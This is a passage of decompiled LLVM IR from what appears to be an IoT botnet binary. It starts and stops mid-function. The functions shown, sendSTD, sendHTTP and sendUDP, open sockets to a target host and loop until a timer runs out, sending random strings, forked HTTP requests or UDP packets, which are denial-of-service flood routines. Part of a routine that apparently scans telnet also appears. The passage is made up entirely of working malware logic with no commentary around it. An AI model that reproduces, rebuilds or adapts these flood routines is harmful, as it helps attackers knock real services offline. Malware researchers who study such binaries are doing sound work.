  %v2_c330 = load i32, i32* %v1_c300, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_c344 = call i32 @__libc_send(i32 %v2_c330, i32* bitcast ([8 x i8]* @global_var_194c0.383 to i32*), i32 7, i32 16384)
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_c360 = load i32, i32* %v1_c300, align 4
  store i32 %v2_c360, i32* @r4, align 4
  %v2_c368 = load i32, i32* bitcast ([443 x i8]** @global_var_231a0.386 to i32*), align 4
  store i32 %v2_c368, i32* @r5, align 4
  store i32 %v2_c368, i32* %r3.global-to-local, align 4
  %v1_c374 = inttoptr i32 %v2_c368 to i8*
  %v3_c378 = call i32 @strlen(i8* %v1_c374)
  %v0_c380 = load i32, i32* @r4, align 4
  %v0_c384 = load i32, i32* @r5, align 4
  store i32 %v3_c378, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %tmp44 = inttoptr i32 %v0_c384 to i32*
  %v6_c390 = call i32 @__libc_send(i32 %v0_c380, i32* %tmp44, i32 %v3_c378, i32 16384)
  store i32 %v6_c390, i32* %r3.global-to-local, align 4
  %v1_c398 = icmp slt i32 %v6_c390, 0
  br i1 %v1_c398, label %dec_label_pc_c3a0, label %dec_label_pc_c3c4

dec_label_pc_c3a0:                                ; preds = %dec_label_pc_c2b0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c3bc = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_c3c4:                                ; preds = %dec_label_pc_c2b0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_c3e0 = add i32 %v2_b308, %v2_ba24
  store i32 %v2_c3e0, i32* %r3.global-to-local, align 4
  %v1_c3e4 = inttoptr i32 %v2_c3e0 to i32*
  %v2_c3e4 = load i32, i32* %v1_c3e4, align 4
  store i32 %v2_c3e4, i32* %r3.global-to-local, align 4
  %v1_c3e8 = add i32 %v2_c3e4, 25
  store i32 %v1_c3e8, i32* @r4, align 4
  %v2_c3f0 = call i32 @__GI_time(i32* null)
  store i32 %v2_c3f0, i32* %r3.global-to-local, align 4
  %v0_c3f8 = load i32, i32* @r4, align 4
  %v3_c3f8 = icmp ult i32 %v0_c3f8, %v2_c3f0
  br i1 %v3_c3f8, label %dec_label_pc_c400, label %dec_label_pc_c420

dec_label_pc_c400:                                ; preds = %dec_label_pc_c3c4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c41c = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c420

dec_label_pc_c420:                                ; preds = %dec_label_pc_ba0c, %dec_label_pc_bb58, %dec_label_pc_bdf8, %dec_label_pc_c224, %dec_label_pc_c3c4, %dec_label_pc_b358, %dec_label_pc_b5f4, %dec_label_pc_c3a0, %dec_label_pc_c260, %dec_label_pc_c200, %dec_label_pc_c134, %dec_label_pc_c10c, %dec_label_pc_c080, %dec_label_pc_bf84, %dec_label_pc_bf60, %dec_label_pc_bf00, %dec_label_pc_be34, %dec_label_pc_bdd0, %dec_label_pc_bda8, %dec_label_pc_bce4, %dec_label_pc_bcc0, %dec_label_pc_bc60, %dec_label_pc_bb94, %dec_label_pc_bb30, %dec_label_pc_bb08, %dec_label_pc_ba48, %dec_label_pc_b9e8, %dec_label_pc_b954, %dec_label_pc_b930, %dec_label_pc_b784, %dec_label_pc_b760, %dec_label_pc_b5c8, %dec_label_pc_c400
  %v1_c424 = add nuw nsw i32 %storemerge553, 1
  store i32 %v1_c424, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_c438 = icmp slt i32 %v1_c424, %arg2
  br i1 %v5_c438, label %dec_label_pc_b2f4, label %dec_label_pc_b2e8

; uselistorder directives
  uselistorder i32 %v1_c424, { 2, 1, 0 }
  uselistorder i32 %v3_c378, { 1, 0 }
  uselistorder i32* %v1_bfc4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bed8, { 1, 0 }
  uselistorder i32 %v3_bc38, { 1, 0 }
  uselistorder i32 %v5_b8c0, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_b4a0, { 1, 0 }
  uselistorder i32 %v2_b3f4, { 0, 3, 2, 1 }
  uselistorder i32 %v2_b3f0, { 1, 0, 2, 3 }
  uselistorder i8* %v2_b3c8, { 1, 0, 2 }
  uselistorder i8 %v2_b378, { 1, 0 }
  uselistorder i32 %v0_b33c, { 1, 0 }
  uselistorder i32* %v1_b314, { 1, 0, 2 }
  uselistorder i32 %v2_b310, { 1, 0, 2, 3 }
  uselistorder i32 %v2_b30c, { 76, 75, 74, 73, 77, 78, 80, 79, 59, 58, 61, 60, 63, 64, 65, 67, 66, 62, 69, 68, 70, 72, 71, 53, 52, 51, 50, 55, 54, 57, 56, 46, 45, 47, 4, 49, 48, 40, 39, 38, 37, 42, 41, 44, 43, 33, 32, 34, 3, 36, 35, 27, 26, 25, 24, 18, 19, 20, 22, 21, 23, 28, 29, 31, 30, 6, 8, 7, 9, 10, 11, 13, 12, 1, 2, 15, 14, 0, 17, 16, 5 }
  uselistorder i32 %v2_b308, { 0, 1, 2, 3, 4, 5, 7, 8, 6 }
  uselistorder i32 %v3_b300, { 80, 81, 79, 77, 78, 76, 75, 74, 60, 61, 59, 64, 65, 72, 71, 70, 68, 69, 67, 66, 63, 73, 62, 58, 57, 55, 56, 53, 54, 52, 51, 50, 46, 47, 45, 49, 48, 44, 43, 41, 42, 39, 40, 38, 37, 36, 32, 33, 31, 35, 34, 30, 29, 27, 28, 26, 24, 25, 22, 21, 23, 20, 19, 18, 17, 16, 11, 9, 10, 8, 7, 6, 5, 4, 15, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge553, { 1, 4, 5, 6, 7, 10, 9, 8, 3, 2, 0 }
  uselistorder i32 %v2_ba24, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_b7ac, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_b64c, { 1, 0 }
  uselistorder i32 %v1_b2cc, { 1, 2, 0 }
  uselistorder i32 %v1_b2a8, { 2, 1, 0 }
  uselistorder i32 %storemerge462, { 1, 0 }
  uselistorder i32 %v2_b1c8, { 1, 0 }
  uselistorder i32 %v3_b1a4, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 148, 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 34, 35, 38, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 53, 50, 51, 54, 55, 56, 52, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 74, 71, 72, 75, 76, 77, 73, 80, 78, 79, 81, 84, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 172, 103, 104, 105, 106, 109, 107, 108, 110, 111, 112, 113, 114, 115, 116, 117, 119, 118, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 173, 149, 150, 151, 164, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 174, 165, 166, 167, 169, 168, 171, 170 }
  uselistorder i32* %r2.global-to-local, { 97, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 102, 98, 99, 103, 100, 101 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 ptrtoint ([334 x i8*]* @global_var_231c8.374 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_19454.372 to i32*), { 1, 0 }
  uselistorder i32 ptrtoint ([343 x i8*]* @global_var_231a4.370 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 5, 4, 2, 7, 6, 0, 1, 3, 8, 9 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c420, { 32, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 5 }
  uselistorder label %dec_label_pc_b7c0, { 1, 0 }
  uselistorder label %dec_label_pc_b784, { 1, 0 }
  uselistorder label %dec_label_pc_b358, { 1, 0 }
  uselistorder label %dec_label_pc_b2f4, { 1, 0 }
  uselistorder label %dec_label_pc_b2e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1ec, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_c444 = load i32, i32* @fp, align 4
  store i32 %v3_c444, i32* %stack_var_-16, align 4
  store i32 50252, i32* %stack_var_-4, align 4
  %v13_c444 = ptrtoint i32* %stack_var_-16 to i32
  %v2_c448 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c448, i32* @fp, align 4
  store i32 %arg3, i32* %stack_var_-208, align 4
  %v0_c468 = call i32 @socket()
  %v2_c478 = call i32 @__GI_time(i32* null)
  %v1_c48c = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 16, i32* @r2, align 4
  %v2_c4a8 = bitcast i32* %stack_var_-52 to i8*
  %v3_c4a8 = call i32 @__GI_memset(i8* %v2_c4a8, i32 0)
  %v1_c4b0 = add i32 %v1_c48c, 16
  %v2_c4b0 = inttoptr i32 %v1_c4b0 to i32*
  %v3_c4b0 = load i32, i32* %v2_c4b0, align 4
  %v1_c4b4 = inttoptr i32 %v3_c4b0 to i32*
  %v2_c4b4 = load i32, i32* %v1_c4b4, align 4
  %v2_c4bc = ptrtoint i32* %stack_var_-48 to i32
  %v1_c4c4 = add i32 %v1_c48c, 12
  %v2_c4c4 = inttoptr i32 %v1_c4c4 to i32*
  %v3_c4c4 = load i32, i32* %v2_c4c4, align 4
  store i32 %v3_c4c4, i32* @r2, align 4
  %v3_c4d4 = call i32 @bcopy(i32 %v2_c4b4, i32 %v2_c4bc, i32 %v3_c4c4)
  %v1_c4dc = add i32 %v1_c48c, 8
  %v2_c4dc = inttoptr i32 %v1_c4dc to i32*
  %v3_c4dc = load i32, i32* %v2_c4dc, align 4
  %v3_c4e4 = urem i32 %v3_c4dc, 65536
  store i32 %v3_c4e4, i32* %stack_var_-52, align 4
  %v2_c518 = ptrtoint i32* %stack_var_-196 to i32
  %v3_c594 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_c554 = add i32 %v13_c444, -180
  br label %dec_label_pc_c514

dec_label_pc_c514:                                ; preds = %dec_label_pc_c5d0, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_c5d4, %dec_label_pc_c5d0 ]
  store i32 %v2_c518, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1966c.424 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_c52c = call i32 @memcpy()
  %v0_c530 = call i32 @random()
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_c5d0, label %dec_label_pc_c570

dec_label_pc_c570:                                ; preds = %dec_label_pc_c514
  %v2_c540 = urem i32 %v0_c530, 36
  %v3_c54c = mul nuw nsw i32 %v2_c540, 4
  %v2_c558 = add i32 %v2_c554, %v3_c54c
  %v1_c55c = inttoptr i32 %v2_c558 to i32*
  %v2_c55c = load i32, i32* %v1_c55c, align 4
  %v5_c580 = inttoptr i32 %v2_c55c to i32*
  %v6_c580 = call i32 @__libc_send(i32 %v0_c468, i32* %v5_c580, i32 65, i32 0)
  %v4_c594 = call i32 @__libc_connect(i32 %v0_c468, %sockaddr* %v3_c594, i32 16)
  %v2_c59c = call i32 @__GI_time(i32* null)
  %v3_c5a8 = load i32, i32* %stack_var_-208, align 4
  %v2_c5ac = add i32 %v3_c5a8, %v2_c478
  %v5_c5b4 = icmp slt i32 %v2_c59c, %v2_c5ac
  br i1 %v5_c5b4, label %dec_label_pc_c5c8, label %dec_label_pc_c5b8

dec_label_pc_c5b8:                                ; preds = %dec_label_pc_c570
  %v1_c5bc = call i32 @__libc_close(i32 %v0_c468)
  %v1_c5c4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_c5c8:                                ; preds = %dec_label_pc_c570
  br label %dec_label_pc_c5d0

dec_label_pc_c5d0:                                ; preds = %dec_label_pc_c514, %dec_label_pc_c5c8
  %stack_var_-24.0 = phi i32 [ %storemerge3, %dec_label_pc_c514 ], [ 0, %dec_label_pc_c5c8 ]
  %v1_c5d4 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_c514

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_c4c4, { 1, 0 }
  uselistorder i32 %v1_c48c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32 65, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_c5d0, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-545 = alloca i32, align 4
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v1_c5e4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_c5e4, i32* @ip, align 4
  %v3_c5e8 = load i32, i32* @fp, align 4
  store i32 50672, i32* %stack_var_-4, align 4
  %v2_c5ec = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c5ec, i32* @fp, align 4
  %v2_c610 = call i32 @__GI_time(i32* null)
  %v3_c618 = load i32, i32* %stack_var_0, align 4
  %v2_c61c = add i32 %v3_c618, %v2_c610
  %v2_c65c = ptrtoint i32* %stack_var_-544 to i32
  %tmp24 = bitcast i32* %stack_var_-544 to i8*
  %v2_c6e8 = ptrtoint i32* %stack_var_-545 to i32
  %v5_c73c31 = icmp sgt i32 %arg6, 0
  br i1 %v5_c73c31, label %dec_label_pc_c638, label %dec_label_pc_c740

dec_label_pc_c638:                                ; preds = %entry, %dec_label_pc_c724
  %storemerge232 = phi i32 [ %v1_c728, %dec_label_pc_c724 ], [ 0, %entry ]
  %v0_c638 = call i32 @random()
  %v2_c648 = srem i32 %v0_c638, 36
  %v4_c658 = mul nsw i32 %v2_c648, 4
  %v5_c658 = add i32 %v4_c658, ptrtoint ([37 x i8*]* @global_var_2310c.463 to i32)
  %v6_c658 = inttoptr i32 %v5_c658 to i32*
  %v7_c658 = load i32, i32* %v6_c658, align 4
  store i32 %v2_c65c, i32* @r0, align 4
  %v7_c67c = call i32 @sprintf(i32 %v2_c65c, i32 ptrtoint ([64 x i8]* @global_var_196fc.465 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v7_c658)
  %v0_c680 = call i32 @__libc_fork()
  %v2_c688 = icmp eq i32 %v0_c680, 0
  br i1 %v2_c688, label %dec_label_pc_c724, label %dec_label_pc_c704

dec_label_pc_c694:                                ; preds = %dec_label_pc_c704
  %v5_c6ac = call i32 @socket_connect(i32 %arg2, i8 %arg3, i32 %tmp)
  %v2_c6bc = icmp eq i32 %v5_c6ac, 0
  br i1 %v2_c6bc, label %dec_label_pc_c704, label %dec_label_pc_c6c4

dec_label_pc_c6c4:                                ; preds = %dec_label_pc_c694
  %v3_c6cc = call i32 @strlen(i8* %tmp24)
  store i32 %v3_c6cc, i32* @r2, align 4
  %v3_c6e0 = call i32 @__libc_write(i32 %v5_c6ac, i32* nonnull %stack_var_-544)
  store i32 %v2_c6e8, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_c6f8 = call i32 @__libc_read(i32 %v5_c6ac)
  %v1_c700 = call i32 @__libc_close(i32 %v5_c6ac)
  br label %dec_label_pc_c704

dec_label_pc_c704:                                ; preds = %dec_label_pc_c694, %dec_label_pc_c6c4, %dec_label_pc_c638
  %v2_c708 = call i32 @__GI_time(i32* null)
  %v5_c718 = icmp slt i32 %v2_c708, %v2_c61c
  br i1 %v5_c718, label %dec_label_pc_c694, label %dec_label_pc_c71c

dec_label_pc_c71c:                                ; preds = %dec_label_pc_c704
  %v1_c720 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_c724

dec_label_pc_c724:                                ; preds = %dec_label_pc_c638, %dec_label_pc_c71c
  %v9_c7444 = phi i32 [ 0, %dec_label_pc_c638 ], [ %v1_c720, %dec_label_pc_c71c ]
  %v1_c728 = add nuw nsw i32 %storemerge232, 1
  %v5_c73c = icmp slt i32 %v1_c728, %arg6
  br i1 %v5_c73c, label %dec_label_pc_c638, label %dec_label_pc_c740

dec_label_pc_c740:                                ; preds = %dec_label_pc_c724, %entry
  %v9_c744.lcssa = phi i32 [ %v2_c610, %entry ], [ %v9_c7444, %dec_label_pc_c724 ]
  store i32 %v3_c5e8, i32* @fp, align 4
  ret i32 %v9_c744.lcssa

; uselistorder directives
  uselistorder i32 %v1_c728, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_c724, { 1, 0 }
  uselistorder label %dec_label_pc_c704, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c638, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_c754 = load i32, i32* @r4, align 4
  %v6_c754 = load i32, i32* @fp, align 4
  store i32 51036, i32* %stack_var_-4, align 4
  %v2_c758 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c758, i32* @fp, align 4
  %v2_c75c = ptrtoint i32* %stack_var_-144 to i32
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_c784 = icmp eq i32 %arg2, 0
  br i1 %v2_c784, label %dec_label_pc_c78c, label %dec_label_pc_c7ac

dec_label_pc_c78c:                                ; preds = %entry
  %v0_c78c = call i32 @rand_cmwc()
  %v3_c794 = mul i32 %v0_c78c, 65536
  store i32 %v3_c794, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c7d0

dec_label_pc_c7ac:                                ; preds = %entry
  %v3_c7b4 = urem i32 %arg2, 65536
  store i32 %v3_c7b4, i32* %r3.global-to-local, align 4
  %v1_c7bc = call i32 @htons(i32 %v3_c7b4)
  br label %dec_label_pc_c7d0

dec_label_pc_c7d0:                                ; preds = %dec_label_pc_c78c, %dec_label_pc_c7ac
  %v2_c7d4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_c7d4, i32* %r3.global-to-local, align 4
  %v3_c7e0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  store i32 %v3_c7e0, i32* %r3.global-to-local, align 4
  %v2_c7e8 = icmp eq i32 %v3_c7e0, 0
  br i1 %v2_c7e8, label %dec_label_pc_c7f0, label %dec_label_pc_ce44

dec_label_pc_c7f0:                                ; preds = %dec_label_pc_c7d0
  %v2_c7f0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_c7f4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_c7f4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v7_c814 = icmp eq i32 %arg4, 32
  br i1 %v7_c814, label %dec_label_pc_c81c, label %dec_label_pc_c9b0

dec_label_pc_c81c:                                ; preds = %dec_label_pc_c7f0
  store i32 17, i32* @r2, align 4
  %v0_c828 = call i32 @socket()
  store i32 %v0_c828, i32* %r3.global-to-local, align 4
  %v2_c838 = icmp eq i32 %v0_c828, 0
  br i1 %v2_c838, label %dec_label_pc_c840, label %dec_label_pc_c858

dec_label_pc_c840:                                ; preds = %dec_label_pc_c81c
  %v2_c844 = load i32, i32* @global_var_23b28.49, align 4
  store i32 %v2_c844, i32* %r3.global-to-local, align 4
  %v3_c850 = call i32 @Rootsprintf(i32 %v2_c844, i32 ptrtoint ([27 x i8]* @global_var_1973c.468 to i32))
  br label %dec_label_pc_ce44

dec_label_pc_c858:                                ; preds = %dec_label_pc_c81c
  %v3_c858 = load i32, i32* %stack_var_0, align 4
  %v1_c85c = add i32 %v3_c858, 1
  store i32 %v1_c85c, i32* %r3.global-to-local, align 4
  %v1_c864 = call i32 @malloc(i32 %v1_c85c)
  store i32 %v1_c864, i32* %r3.global-to-local, align 4
  %v2_c874 = icmp eq i32 %v1_c864, 0
  br i1 %v2_c874, label %dec_label_pc_ce44, label %dec_label_pc_c87c

dec_label_pc_c87c:                                ; preds = %dec_label_pc_c858
  %v3_c87c = load i32, i32* %stack_var_0, align 4
  %v1_c880 = add i32 %v3_c87c, 1
  store i32 %v1_c880, i32* @r2, align 4
  store i32 %v1_c864, i32* %r3.global-to-local, align 4
  %v2_c894 = inttoptr i32 %v1_c864 to i8*
  %v3_c894 = call i32 @__GI_memset(i8* %v2_c894, i32 0)
  %v2_c8a0 = call i32 @makeRandomStr(i32 %v1_c864, i32 %v3_c87c)
  %v2_c8a8 = call i32 @__GI_time(i32* null)
  %v2_c8b4 = add i32 %v2_c8a8, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_c8f4 = inttoptr i32 %v1_c864 to i32*
  %v3_c978 = mul i32 %arg8, 4
  %v3_c988 = mul i32 %arg8, 1000
  br label %dec_label_pc_c8d0.outer

dec_label_pc_c8d0.outer:                          ; preds = %dec_label_pc_c9a0, %dec_label_pc_c970, %dec_label_pc_c87c
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_c87c ], [ %v1_c9a4, %dec_label_pc_c9a0 ], [ 0, %dec_label_pc_c970 ]
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_c87c ], [ %v1_c958, %dec_label_pc_c9a0 ], [ %v1_c958, %dec_label_pc_c970 ]
  br label %dec_label_pc_c8d0

dec_label_pc_c8d0:                                ; preds = %dec_label_pc_c8d0.outer, %dec_label_pc_c948
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_c948 ], [ %stack_var_-112.0.ph, %dec_label_pc_c8d0.outer ]
  %v3_c8d0 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_c7f0, i32* %stack_var_-144, align 4
  store i32 %v3_c8d0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_c8f4 = call i32 @__libc_sendto(i32 %v0_c828, i32* %v6_c8f4, i32 %v3_c8d0, i32 0, i32 %v2_c7f0, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_c900 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_c900, label %dec_label_pc_c908, label %dec_label_pc_c954

dec_label_pc_c908:                                ; preds = %dec_label_pc_c8d0
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_c784, label %dec_label_pc_c914, label %dec_label_pc_c930

dec_label_pc_c914:                                ; preds = %dec_label_pc_c908
  %v0_c914 = call i32 @rand_cmwc()
  %v3_c920 = udiv i32 %v0_c914, 256
  %v3_c9285 = urem i32 %v3_c920, 256
  store i32 %v3_c9285, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c930

dec_label_pc_c930:                                ; preds = %dec_label_pc_c908, %dec_label_pc_c914
  %v2_c934 = call i32 @__GI_time(i32* null)
  store i32 %v2_c934, i32* %r2.global-to-local, align 4
  store i32 %v2_c8b4, i32* %r3.global-to-local, align 4
  %v8_c944 = icmp sgt i32 %v2_c934, %v2_c8b4
  br i1 %v8_c944, label %dec_label_pc_ce44, label %dec_label_pc_c948

dec_label_pc_c948:                                ; preds = %dec_label_pc_c930
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c8d0

dec_label_pc_c954:                                ; preds = %dec_label_pc_c8d0
  %v1_c958 = add i32 %stack_var_-112.0, 1
  store i32 %arg7, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_c968 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_c968, label %dec_label_pc_c970, label %dec_label_pc_c9a0

dec_label_pc_c970:                                ; preds = %dec_label_pc_c954
  store i32 %v3_c978, i32* %r2.global-to-local, align 4
  store i32 %v3_c988, i32* %r3.global-to-local, align 4
  %v1_c990 = call i32 @usleep(i32 %v3_c988)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c8d0.outer

dec_label_pc_c9a0:                                ; preds = %dec_label_pc_c954
  %v1_c9a4 = add i32 %stack_var_-108.0.ph, 1
  br label %dec_label_pc_c8d0.outer

dec_label_pc_c9b0:                                ; preds = %dec_label_pc_c7f0
  store i32 %v2_c75c, i32* %r3.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v0_c9c4 = call i32 @socket()
  store i32 %v0_c9c4, i32* %r3.global-to-local, align 4
  %v2_c9d4 = icmp eq i32 %v0_c9c4, 0
  br i1 %v2_c9d4, label %dec_label_pc_c9dc, label %dec_label_pc_c9f4

dec_label_pc_c9dc:                                ; preds = %dec_label_pc_c9b0
  %v2_c9e0 = load i32, i32* @global_var_23b28.49, align 4
  store i32 %v2_c9e0, i32* %r3.global-to-local, align 4
  %v3_c9ec = call i32 @Rootsprintf(i32 %v2_c9e0, i32 ptrtoint ([27 x i8]* @global_var_1973c.468 to i32))
  br label %dec_label_pc_ce40

dec_label_pc_c9f4:                                ; preds = %dec_label_pc_c9b0
  store i32 1, i32* %stack_var_-80, align 4
  %v2_c9fc = ptrtoint i32* %stack_var_-80 to i32
  store i32 4, i32* %stack_var_-144, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_c9fc, i32* %r3.global-to-local, align 4
  %v6_ca18 = call i32 @__GI_setsockopt(i32 %v0_c9c4, i32 0, i32 3, i32* nonnull %stack_var_-80, i32 4)
  store i32 %v6_ca18, i32* %r3.global-to-local, align 4
  %v1_ca20 = icmp slt i32 %v6_ca18, 0
  br i1 %v1_ca20, label %dec_label_pc_ca28, label %dec_label_pc_ca40

dec_label_pc_ca28:                                ; preds = %dec_label_pc_c9f4
  %v2_ca2c = load i32, i32* @global_var_23b28.49, align 4
  store i32 %v2_ca2c, i32* %r3.global-to-local, align 4
  %v3_ca38 = call i32 @Rootsprintf(i32 %v2_ca2c, i32 ptrtoint ([33 x i8]* @global_var_19758.470 to i32))
  br label %dec_label_pc_ce40

dec_label_pc_ca40:                                ; preds = %dec_label_pc_c9f4
  store i32 49, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ca4c

dec_label_pc_ca4c:                                ; preds = %dec_label_pc_ca40, %dec_label_pc_ca4c
